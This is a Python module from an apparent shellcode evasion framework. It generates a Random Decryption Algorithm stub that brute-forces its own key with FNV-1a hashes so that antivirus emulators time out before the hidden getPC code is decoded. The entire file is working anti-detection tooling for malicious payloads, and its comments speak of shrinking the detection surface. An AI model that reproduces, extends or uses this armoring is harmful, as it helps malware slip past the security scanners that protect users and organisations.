#!/usr/bin/python

"""
RDA
Anti-emulation armoring using Random Decryption Algorithm (RDA) to exceed execution threshold
"""

from struct import unpack
from random import choice, shuffle
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, stackframepointer_registers, arch_registers, bit_packs, word_keywords, acc_regs, ctr_regs, base_regs, src_index_regs, dest_index_regs

class evasion_timeout_rda(evasion_module):

    #
    # Overriden method to fill key registery
    # No returned code here because this is handled by getPCStub as key setting for RDA is done by brute-force
    #
	def keyfiller_stub(self, key_reg, key):
		self.key_reg = key_reg
		self.key_val = key
		return ""

    #
    # Fowler-Noll-Vo (1a) is a 32-bit non-cryptographic hash function, taken from https://gist.github.com/vaiorabbit/5670985
    # FNV-1a was chosen because of its reasonably low collision rate and its small implementational size (lowering detection surface)
    #
    # TODO: support 64-bit version too
    #
	def fnv_1a_32(self, data):
		hval = 0x811c9dc5
		fnv_32_prime = 0x01000193
		uint32_max = 2 ** 32
		for s in data:
			hval = hval ^ ord(s)
			hval = (hval * fnv_32_prime) % uint32_max
		return hval

    #
    # Generates Random Decryption Algorithm (RDA)-based timeout GetPC and key recovery stub
    # 
    # [*] Limitations:
    #     - Some error proneness due to collisions in FNV-1a
    #
    # [*] Note:
    #       - Improve by:
    #         - implementing routine in obtain_key override that only obtains keys where there are no collisions with hash for inputs below keyvalue
    #         OR
    #         - using either different hash function or operate on bigger hashing output space (eg. 128-bit)
    #
	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		regs = arch_registers(self.arch, self.bits)

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]
		base_reg = base_regs[self.bits]
		base_reg_08_low = regs.gp_reg_to_size(base_reg, self.bits, (8 | 0))
		src_index_reg = src_index_regs[self.bits]
		dest_index_reg = dest_index_regs[self.bits]

		# null instruction
		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		key_reg_bytesize = self.bits / 8

		reg1 = regs.random_gp_reg(False, [])
		reg2 = regs.random_gp_reg(False, []) 
		reg3 = regs.random_gp_reg(False, [])

		# Build stack-based getPC code, store PC in getPCDestReg
		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		plain_getpc_stub = stub_builder.stack_getpc_stub(getpc_reg)

		fnv_plain_getpc_stub = self.fnv_1a_32(plain_getpc_stub)

		fnv_key = self.fnv_1a_32(self.key_val)

		encoded_getpc_stub = (unpack(bit_packs[self.bits], plain_getpc_stub)[0] ^ fnv_key)
		encoded_getpc_stub_size = self.bits / 8

		variables = {'reg_size': reg_size, 'getpc_reg': getpc_reg, 'stackpointer_reg': stackpointer_reg, 'word_keyword': word_keyword, 'fnv_plain_getpc_stub': fnv_plain_getpc_stub, 'encoded_getpc_stub': encoded_getpc_stub, 'encoded_getpc_stub_size': encoded_getpc_stub_size, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'null_instr': null_instr, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'base_reg': base_reg, 'base_reg_08_low': base_reg_08_low, 'src_index_reg': src_index_reg, 'dest_index_reg': dest_index_reg, 'key_reg': self.key_reg, 'key_reg_bytesize': key_reg_bytesize}

		listing = '''
main:
	JMP start_stub

; FNV-1a (32-bit) from http://isthe.com/chongo/tech/comp/fnv/
fast_fnv_1a:
	PUSH {base_reg}
	PUSH {src_index_reg}
	PUSH {dest_index_reg}
	; buffer
	MOV {src_index_reg}, {word_keyword} PTR [{stackpointer_reg} + 0x10]
	; length
	MOV {ctr_reg}, {word_keyword} PTR [{stackpointer_reg} + 0x14]
	; basis
	MOV {acc_reg}, {word_keyword} PTR [{stackpointer_reg} + 0x18]
	; fnv_32_prime
	MOV {dest_index_reg}, 0x1000193
	{null_instr} {base_reg}, {base_reg}
nexta:
	MOV {base_reg_08_low}, BYTE PTR [{src_index_reg}]
	XOR {acc_reg}, {base_reg}
	MUL {dest_index_reg}
	INC {src_index_reg}
	DEC {ctr_reg}
	JNZ nexta

	POP {dest_index_reg}
	POP {src_index_reg}
	POP {base_reg}
	RET 0x0C

start_stub:
	{null_instr} {key_reg}, {key_reg}

next_key:
	INC {key_reg}
	PUSH {key_reg}
	MOV {reg1}, {stackpointer_reg}

	PUSH {key_reg_bytesize}
	PUSH {reg1}
	CALL fast_fnv_1a

	PUSH {encoded_getpc_stub}

	XOR {word_keyword} PTR [{stackpointer_reg}], {acc_reg}
	MOV {reg2}, {stackpointer_reg}

	PUSH {encoded_getpc_stub_size}
	PUSH {reg2}
	CALL fast_fnv_1a

	CMP {acc_reg}, {fnv_plain_getpc_stub}
	JZ execute_getpc
	POP {reg3}
	POP {key_reg}
	JMP next_key

execute_getpc:
	CALL {stackpointer_reg}
	SUB {getpc_reg}, (-5 % {reg_size})
	POP {key_reg}
	POP {key_reg}	
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub